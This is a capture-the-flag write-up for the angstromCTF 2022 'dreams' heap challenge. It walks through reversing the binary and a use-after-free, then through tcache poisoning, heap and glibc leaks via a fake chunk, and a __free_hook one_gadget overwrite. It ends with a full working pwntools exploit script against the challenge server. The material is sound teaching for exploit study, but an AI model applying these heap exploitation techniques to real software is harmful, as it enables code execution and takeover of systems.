# dreams_angstrom_22

## preamble

This is my first write-up but I had a really pleasant experience with this
problem and felt like sharing.  A group of University of Delaware CTFers get
together every Wednesday afternoon and train together and this week there was
a live CTF during our session with only about 3 hours left in it.  So we
jumped in and divvied up the PWN problems.  This is the only problem in this
Angstrom that I attempted this year and it was done under time pressure.
Picked it because it had a nice solves to points ratio and I wanted a
challenge.

----

# My PWN framework

When I tackle a PWN I have to answer three questions:

1) What is my __strategic goal__? (Win function?  One Gadget?  Shellcode?
syscalls? Libc goodies?)  
2) How will I __control the instruction pointer__?  (control the stack at a
`ret`? Write-What-Where plus one of GOT overwrite, `__malloc_hook`,
`__free_hook`, FSOP, or something else?)  
3) Do I need leaks to __conquer randomization__? (Need a Stack leak? glibc
leak? Code segment leak? Heap leak?)

----

## The pre-reversing scouting

Step one, run `checksec` and what do we see?

```diff  
[*] '/ctf/work/vip/angstrom/raw/dreams'  
+    Arch:     amd64-64-little  
+    RELRO:    Full RELRO  
+    Stack:    Canary found  
+    NX:       NX enabled  
-    PIE:      No PIE (0x400000)  
```

OK so we're on alert for some sort of symbol that will add benefit.  Let's
poke through the symbols using `rabin2 -s dreams` and see what we see.  I'll
highlight the lines that stood out to me (and stripped the first lines that
weren't as interesting):

```diff  
root@vip:/ctf/work/vip/angstrom/raw# rabin2 -s dreams  
[Symbols]

nth paddr      vaddr      bind   type   size lib name  
―――――――――――――――――――――――――――――――――――――――――――――――――――――  
47  0x00003000 0x00404000 WEAK   NOTYPE 0        data_start  
+ 48  ---------- 0x00404028 GLOBAL OBJ    8        dreams  
+ 50  0x000012f1 0x004012f1 GLOBAL FUNC   354      gosleep  
51  ---------- 0x00404014 GLOBAL NOTYPE 0        _edata  
+ 52  0x000012b6 0x004012b6 GLOBAL FUNC   59       menu  
53  0x000017e8 0x004017e8 GLOBAL FUNC   0        _fini  
61  0x00003000 0x00404000 GLOBAL NOTYPE 0        __data_start  
64  0x00003008 0x00404008 GLOBAL OBJ    0        __dso_handle  
65  0x00002000 0x00402000 GLOBAL OBJ    4        _IO_stdin_used  
66  0x00001770 0x00401770 GLOBAL FUNC   101      __libc_csu_init  
+ 68  0x00003010 0x00404010 GLOBAL OBJ    4        MAX_DREAMS  
69  ---------- 0x00404030 GLOBAL NOTYPE 0        _end  
70  0x00001200 0x00401200 GLOBAL FUNC   5        _dl_relocate_static_pie  
71  0x000011d0 0x004011d0 GLOBAL FUNC   47       _start  
73  ---------- 0x00404014 GLOBAL NOTYPE 0        __bss_start  
74  0x00001646 0x00401646 GLOBAL FUNC   291      main  
+ 75  0x00001453 0x00401453 GLOBAL FUNC   212      sell  
+ 76  0x00001527 0x00401527 GLOBAL FUNC   287      psychiatrist  
79  ---------- 0x00404018 GLOBAL OBJ    0        __TMC_END__  
80  0x00001000 0x00401000 GLOBAL FUNC   0        _init  
+ 1   0x00001100 0x00401100 GLOBAL FUNC   16       imp.free  
2   0x00001110 0x00401110 GLOBAL FUNC   16       imp.puts  
3   0x00001120 0x00401120 GLOBAL FUNC   16       imp.__stack_chk_fail  
4   0x00001130 0x00401130 GLOBAL FUNC   16       imp.setresgid  
5   0x00001140 0x00401140 GLOBAL FUNC   16       imp.setbuf  
6   0x00001150 0x00401150 GLOBAL FUNC   16       imp.printf  
7   0x00001160 0x00401160 GLOBAL FUNC   16       imp.strcspn  
8   0x00001170 0x00401170 GLOBAL FUNC   16       imp.read  
9   ---------- 0x00000000 GLOBAL FUNC   16       imp.__libc_start_main  
10  0x00001180 0x00401180 GLOBAL FUNC   16       imp.getchar  
11  ---------- 0x00000000 WEAK   NOTYPE 16       imp.__gmon_start__  
+ 12  0x00001190 0x00401190 GLOBAL FUNC   16       imp.malloc  
13  0x000011a0 0x004011a0 GLOBAL FUNC   16       imp.getegid  
14  0x000011b0 0x004011b0 GLOBAL FUNC   16       imp.__isoc99_scanf  
15  0x000011c0 0x004011c0 GLOBAL FUNC   16       imp.exit  
```

OK so `malloc` and `free` from glibc along with a `menu`, this sounds like a
heap problem.  Also of note: **dreams, gosleep, sell, psychiatrist,
MAX_DREAMS**

Absent from this list is any kind of a win function.  So that's one less
option for my __strategic goal__ question, next let's check for one gadgets.

```diff  
root@vip:/ctf/work/vip/angstrom/raw# one_gadget libc.so.6  
+ 0xe3b2e execve("/bin/sh", r15, r12)  
constraints:  
 [r15] == NULL || r15 == NULL  
 [r12] == NULL || r12 == NULL

+ 0xe3b31 execve("/bin/sh", r15, rdx)  
constraints:  
 [r15] == NULL || r15 == NULL  
 [rdx] == NULL || rdx == NULL

+ 0xe3b34 execve("/bin/sh", rsi, rdx)  
constraints:  
 [rsi] == NULL || rsi == NULL  
 [rdx] == NULL || rdx == NULL  
```

Awesome, these look reasonable, tentative __strategic goal__ penciled in.

Now, how are we going to __control the instruction pointer__? So the checksec
ruled out GOT and stack control (probably) plus it's a heap problem so I'm
guessing `__malloc_hook` or `__free_hook`.  Let's do a quick check of the
glibc version to make sure it's not 2.34 (where the malloc/free hooks are
finally gone).

So to validate the version I turned to `https://libc.blukat.me/` using `rabin2
-s libc.so.6` to grab a couple offsets and actually realized I recognized the
offset of `printf` already! I had given learners the task of finding this
library just using `cc0` before.  
It is the same glibc 2.31 from my Ubuntu 20.04 running `pwndocker`.  Small
world.

Anyhow, it's 2.31 and that means `__free_hook` and `__malloc_hook` are good
candidates.

We're going to need a _write-what-where_ somehow to pull that off of course.

The last strategic question was how we're going to __conquer randomization__?
We'll need a little more scouting to solve those last two, the write-what-
where and making leaks.

## Reversing the binary

Alright we need leaks and a write-what-where.  When reversing a typical malloc
menu I want to see all of the frees, mallocs, and edits.

The menu has 3 options: `psychiatrist`, `gosleep`, and `sell`.  Here's the
Ghidra decompiled main:

```c  
void main(void)

{  
 long in_FS_OFFSET;  
 int local_18;  
 __gid_t local_14;  
 undefined8 local_10;  
  
 local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);  
 setbuf(stdout,(char *)0x0);  
 local_14 = getegid();  
 setresgid(local_14,local_14,local_14);  
 dreams = malloc((long)(MAX_DREAMS << 3));  
 puts("Welcome to the dream tracker.");  
 puts(  
     "Sleep is where the deepest desires and most pushed-aside feelings of humankind are brought out."  
     );  
 puts("Confide a month of your time.");  
 local_18 = 0;  
 while( true ) {  
   while( true ) {  
     menu();  
     printf("> ");  
     __isoc99_scanf(&DAT_00402104,&local_18);  
     getchar();  
     if (local_18 != 3) break;  
     psychiatrist();  
   }  
   if (3 < local_18) break;  
   if (local_18 == 1) {  
     gosleep();  
   }  
   else {  
     if (local_18 != 2) break;  
     sell();  
   }  
 }  
 puts("Invalid input!");  
                   /* WARNING: Subroutine does not return */  
 exit(1);  
}  
```

OK so `dreams = malloc((long)(MAX_DREAMS << 3));` happens every time, both
`MAX_DREAMS` and `dreams` are global variables.  `MAX_DREAMS` is set to 5 and
we know the address is `0x00404010`.  So that means the opening malloc is for
40 bytes.

The first thing I did was fire up gdb (pwndbg) and check to see if the
`MAX_DREAMS` segment was readable and writable, it was, so keep its
malleability in mind.

Alright, also at this point I'm guessing `gosleep` will be a malloc, `sell`
will be a free, and `psychiatrist` will be an edit or something.

Let's check it out,  `gosleep`:

```c  
void gosleep(void)

{  
 size_t sVar1;  
 long in_FS_OFFSET;  
 int local_1c;  
 char *local_18;  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 puts("3 doses of Ambien finally calms you down enough to sleep.");  
 puts("Toss and turn all you want, your unconscious never loses its grip.");  
 printf("In which page of your mind do you keep this dream? ");  
 local_1c = 0;  
 __isoc99_scanf(&DAT_00402104,&local_1c);  
 getchar();  
 if (((local_1c < MAX_DREAMS) && (-1 < local_1c)) && (*(long *)(dreams +
(long)local_1c * 8) == 0))  
 {  
   local_18 = (char *)malloc(0x1c);  
   printf("What\'s the date (mm/dd/yy))? ");  
   read(0,local_18,8);  
   sVar1 = strcspn(local_18,"\n");  
   local_18[sVar1] = '\0';  
   printf("On %s, what did you dream about? ",local_18);  
   read(0,local_18 + 8,0x14);  
   *(char **)((long)local_1c * 8 + dreams) = local_18;  
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
     __stack_chk_fail();  
   }  
   return;  
 }  
 puts("Invalid index!");  
                   /* WARNING: Subroutine does not return */  
 exit(1);  
}  
```

OK so a few notes here:

1) it asks for an index which should be a value from 0 to `MAX_DREAMS-1`  
2) whatever your index `i` is the code will put a pointer made from
`malloc(28)` at `dreams + 8*i` (in other words `dreams` is an array of
pointers to small chunks)  
3) the first 8 bytes of the new chunk are given first  
4) the next 20 bytes of the chunk are given next

Let's look at the edit function `psychiatrist`:

```c  
void psychiatrist(void)

{  
 long in_FS_OFFSET;  
 int local_14;  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 puts("Due to your HMO plan, you can only consult me to decipher your
dream.");  
 printf("What dream is giving you trouble? ");  
 local_14 = 0;  
 __isoc99_scanf(&DAT_00402104,&local_14);  
 getchar();  
 if (*(long *)(dreams + (long)local_14 * 8) == 0) {  
   puts("Invalid dream!");  
                   /* WARNING: Subroutine does not return */  
   exit(1);  
 }  
 printf("Hmm... I see. It looks like your dream is telling you that ");  
 puts((char *)(*(long *)(dreams + (long)local_14 * 8) + 8));  
 puts(  
     "Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don\'t make the rules. Or do I?"  
     );  
 printf("New date: ");  
 read(0,*(void **)(dreams + (long)local_14 * 8),8);  
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
   __stack_chk_fail();  
 }  
 return;  
}  
```

OK interesting:

1) If you call this function on an index that points to a null address you
will crash the program  
2) It will display the values in your requested chunk starting 8 bytes in  
3) It will overwrite the first 8 bytes of your chunk

So immediately we should be thinking of editing a `fd` pointer inside of the
tcache once a chunk is free'd.  That would make for a great __write-what-
where__ (known as tcache-poisoning, see
https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c).

Also it's possible we can get a __leak__ out of this function but we'll need
the address to be 8 bytes into the chunk which only happens for chunks in the
unsorted bins, small bins, or large bins.  So far we're limited to making
small chunks, so getting into those other bins will take some work.

Before even reversing the free function I start to test if a use-after-free
exists here.  It totally does.

OK onto the free function, `sell`:

```c  
void sell(void)

{  
 long in_FS_OFFSET;  
 int local_14;  
 long local_10;  
  
 local_10 = *(long *)(in_FS_OFFSET + 0x28);  
 puts("You\'ve come to sell your dreams.");  
 printf("Which one are you trading in? ");  
 local_14 = 0;  
 __isoc99_scanf(&DAT_00402104,&local_14);  
 getchar();  
 if ((local_14 < MAX_DREAMS) && (-1 < local_14)) {  
   puts("You let it go. Suddenly you feel less burdened... less restrained...
freed. At last.");  
   free(*(void **)(dreams + (long)local_14 * 8));  
   puts("Your money? Pfft. Get out of here.");  
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
     __stack_chk_fail();  
   }  
   return;  
 }  
 puts("Out of bounds!");  
                   /* WARNING: Subroutine does not return */  
 exit(1);  
}  
```

Nothing too noteworthy here, other than the absence of clearing the free'd
pointer.

Alright so what did we learn while reversing?

1) We cannot control the chunk sizes  
2) We can use-after-free  
3) We can leak but only 8 bytes after the start of the chunk  
4) We can create a write-what-where using tcache-poisoning

What have we not learned yet?  Well, we could win right now IF we had a glibc
leak and one of the one_gadgets is viable.

But we don't have any leaks yet really.  So we have to get clever.

## The Planned Exploit

TLDR: change MAX_DREAMS to a large value, generate a heap leak by using a
large index and dropping a chunk's address into an area I can read, then do
house of spirit to create a glibc leak.

OK so, hear me out, we have a write-what-where, and it's fairly simple too:  
1) malloc A,  
2) malloc B,  
3) free A,  
4) free B,  
5) set the first 8 bytes of B to my target address,  
6) malloc C,  
7) finally malloc D will give me any address I'd like.

(I had immediately setup the write-what-where and was excited until I realized
I had no idea what to target.)

So, if we can overwrite `MAX_DREAMS` (which we do know an address to) then we
can malloc a large number of chunks.

If I can malloc a large block of chunks I _could_ use a heap-leak plus our WWW
to help me overwrite the `size_field` of the first chunk in a block of chunks.
Now when we free it will pretend to be a much larger chunk (`house_of_spirit`
style), that will let us synthesize both a `fd` and `bk` pointer which we can
use the leak/edit function to get our glibc address.

### Changing MAX_DREAMS

Alright, so when I set about targeting MAX_DREAMS my first versions looked
like this (I wrote some utilities for `malloc`, `free`, and `hack` which you
can see in the full exploit script at the bottom:

```python  
malloc(0, "pay1", "pay2")  
malloc(1, "pay3", "pay4")  
free(0)  
free(1)  
hack(1, p64(elf.sym.MAX_DREAMS))  
malloc(2, "junk1", "junk2")  
malloc(3, b"\xff\xff", b"junk3")  
```

This, annoyingly, didn't work.  Also the glibc they gave us didn't have debug
symbols which means I couldn't use the cool `bins` command to inspect my
tcache exploit.  So I pulled out the debug glibc 2.31 (different one_gadgets
so I went right back after debug mode).  

I could confirm that I `MAX_DREAMS` was inside of the tcache, but take a look
at what was going on:

```bash  
pwndbg> bins  
tcachebins  
0x30 [  2]: 0x12c2310 —▸ 0x404010 (MAX_DREAMS) ◂— 0x5  
fastbins  
0x20: 0x0  
0x30: 0x0  
0x40: 0x0  
0x50: 0x0  
0x60: 0x0  
0x70: 0x0  
0x80: 0x0  
unsortedbin  
all: 0x0  
smallbins  
empty  
largebins  
empty  
pwndbg>  
```

That value `0x5` currently in `MAX_DREAMS` was trying to be loaded into
tcache.  So I went looking for a target nearby that was already a null pointer
and I'd just have to his the `MAX_DREAMS` from an offset.  I used `dq
&0x404010-32` to poke around and find a suitable target.

OK so once we can set `MAX_DREAMS` to any value we want, what next?  I know I
want to make a bunch of chunks in a rows to make a fake chunk, but how exactly
will I edit the chunk's metadata?  Well if you have a WWW hammer everything is
a nail, but we'll need a heap leak next.

### Generating our heap_leak

The next thing I did was fart around with our new malloc limits, we can assign
dreams to any index we'd like.  OH WAIT.  How did that code work again?  AH so
if I assign my chunk's address to `i` it will write the chunk's address (a
_heap_ address mind you) to `dreams + 8*i`, awesome!  So that means I can make
a chunk, figure out how far from `dreams` it is, then ask for that distance/8
and it will drop a heap address right into my chunk.  If I target chunk+8 then
I can leak that heap address!  OK next task, our heap leak.  The pwntools
segment looked like this:

```python  
malloc(533, "FINDME", "PAY2")  
chunkleak = heapleak(533)  
heapbase = chunkleak - 4928  
print(hex(heapbase))  
```

Now that's the finished product, how on earth did I get 533 and 4928 you ask?
Well I did `malloc(10, "FINDME", "PAYLOAD2")` and inspected by chunks using
pwndbg's `vis` command.  Now I can never scroll properly when I'm tmux split-
screening so I also used the `heap` command and `dq someaddress` to find the
address of `dream` and the address of my latest chunk+8.  When I subtracted
them I got 4264, which led to adjusting `10` to `4264//8 == 533`.  Then I
wrote a `heapleak` utility function to call the edit and parse my leaked
address using `u64`.  Once I had that address in hand I checked its distance
from the beginning of heap which was 4928.  Both of these numbers are VERY
SPECIFIC to my exact exploit.  If I made a few more or less mallocs before
that moment both would need to be recomputed.

### From heap_leak to glibc_leak (baby house of spirit)

I'm not totally sure if this is the textbook house of spirit or not, but here
was my idea.  

Make enough chunks back to back that I know their entire length is more than
0x420 (easy to remember the tcache cut-off).

Use our heap leak and WWW to target the size_field of the first chunk in our
block of chunks.  Then free the first chunk  
which will make a large, fake, chunk that will go into the unsorted bin.

Alright here's my python:

```python  
#making a block of chunks adjacent to each other, each of size 48  
for i in range(25):  
   malloc(10+i, "fake-"+str(i), "fake2-"+str(i))  
#altogether these make 1200 bytes

#Now we setup our write-what-where via tcache poisoning  
malloc(35, "free1", "free1p")  
malloc(36, "free2", "free2p")  
free(35)  
free(36)

#this target is 16 bytes before the 10th chunk  
offset = 4952  
targethere = heapbase + offset

hack(36, p64(targethere))

malloc(37, "junk", "junk2")  
malloc(38, "junk", p64(0) + p64(0x4b1))  
#OK chunk 10 now looks like it has size 1200 (and prev_in_use flag set to 1)  
free(10)  
```

That just worked.  I was really pleased.  For about 5 minutes.

Getting the glibc leaks was easy enough, just had to debug and calculate some
offsets to get something like this:

```python  
glibcleak = heapleak(10) #glibc  
glibcbase = glibcleak - 2018272 #mainarena + 88 if I recall correctly  
oneg=0xe3b2e  
onegadget = glibcbase + oneg  
freehook = glibcleak + 8808  
```

I was so ready to just win at this point (time was running out) then I setup
the rest of the exploit just in case:

```python  
malloc(41, "free1", "free1a")  
malloc(42, "free2", "free2a")  
free(41)  
free(42)  
hack(42, p64(freehook-16))  
malloc(43, "junk", "junk2")  
malloc(44, "junk", p64(0) + p64(onegadget))  
free(43)  
```

This would setup the last write-what-where and drop our onegadget into the
`__free_hook`.  BUT NO.

So what was wrong with this picture?  Well, if I do a malloc and all of the
tcache and fastbins are empty, then it's going to check the unsorted bins.
But if you ran `bins` after my glibc leak, you'd see the unsorted bins were
labelled `corrupted`.  I started to panic there wasn't time to figure out how
to make my fake chunk more real, only 30 minutes left and I had to get home
ASAP too.

But then it struck me,  if the tcache isn't empty, there's no problem, so
let's just malloc those WWW chunks BEFORE we free the fake one.

The rest was history, 24 minutes left in the CTF and I cracked a proper heap
problem!

Here's the script including the utilities:

```python  
from pwn import *

elf=ELF("./dreams")  
libc = ELF("./libc.so.6")

#TMUX mode (not confident)  
#context.terminal = ['tmux', 'splitw', '-h']  
#p=gdb.debug("./dreams")#, gdbscript=gs)

#LOCAL MODE (more confident)  
#p=process("./dreams")

#REMOTE MORE (let's get this)  
p=remote("challs.actf.co",31227)

def malloc(idx, pay1, pay2):  
   global p  
   r1 = p.sendlineafter(b"> ", "1")  
   r2 = p.sendlineafter(b"keep this dream? ",str(idx))  
   r3 = p.sendlineafter(b"yy))? ",pay1)  
   r4 = p.sendlineafter(b"you dream about? ", pay2)  
   return r1 +r2+r3+r4

def free(idx):  
   global p  
   r1 = p.sendlineafter(b"> ", "2")  
   r2 = p.sendlineafter(b"trading in?",str(idx))  
   return r1 +r2

def hack(idx, payload):  
   global p  
   r1 = p.sendlineafter(b"> ", "3")  
   r2 = p.sendlineafter(b"you trouble?",str(idx))  
   r3 = p.sendlineafter(b"New date:",payload)  
   return r1 +r2+r3

def heapleak(idx):  
   global p  
   r1 = p.sendlineafter(b"> ", "3")  
   r2 = p.sendlineafter(b"you trouble?", str(idx))  
   r3 = p.recvuntil(b"you that ")  
   leakraw = p.recvuntil(b"\n")[:-1]  
   theleak = u64(leakraw + b"\x00"*(8-len(leakraw)))  
   p.sendlineafter(b"New date:", b"JUNK")  
   return theleak

malloc(0, "junk1", "junk2")  
malloc(1, "junk3", "junk4")  
free(0)  
free(1)  
target = 0x404028-32

print(hack(1, p64(target)))  
print(malloc(2, "junk5", "junk6"))  
malloc(3, b"\xff\xff", b"\xff\xff\xff")  
#this set MAX_DREAMS to a large number

#Now I can make a fake chunk of a large enough size to get a glibc leak  
malloc(533, "FINDME", "PAY2")  
chunkleak = heapleak(533)  
heapbase = chunkleak - 4928  
print(hex(heapbase))

for i in range(25):  
   malloc(10+i, "fake-"+str(i), "fake2-"+str(i))

malloc(35, "free1", "free1p")  
malloc(36, "free2", "free2p")  
free(35)  
free(36)  
offset = 4952  
targethere = heapbase + offset  
#this is 16 bytes before the 10th chunk  
hack(36, p64(targethere))  
malloc(37, "junk", "junk2")  
malloc(38, "junk", p64(0) + p64(0x4b1))  
malloc(41, "free1", "free1a")  
malloc(42, "free2", "free2a")  
free(10)  
glibcleak = heapleak(10) #glibc  
glibcbase = glibcleak - 2018272  
oneg=0xe3b2e  
oneg=0xe3b31  
onegadget = glibcbase + oneg  
freehook = glibcleak + 8808  
print(hex(freehook), "freehook")

free(41)  
free(42)  
hack(42, p64(freehook-16))  
malloc(43, "junk", "junk2")  
malloc(44, "junk", p64(0) + p64(onegadget))  
p.sendlineafter(b"> ","2")  
#p.sendlineafter(b"in?","43")  
#free(43)  
p.interactive()  
```

## MISTAKES

So I just saw someone else's script and immediately learned a couple of
things.

1) tcache does put a value in the `bk` pointer a pointer back to the tcache
struct it belongs to.  I didn't need to do funky stuff to make a heap leak at
all.  
2) I didn't need to overwrite `MAX_DREAMS` and make a big funky fake chunk to
get a glibc leak.  
3) I forgot to tell you I needed to cycle to the second onegadget, but
onegadget isn't needed system("/bin/sh") is just fine using free_hook as
system and writing "/bin/sh" into a chunk.

Original writeup (https://github.com/AndyNovo/dreams_angstrom_22).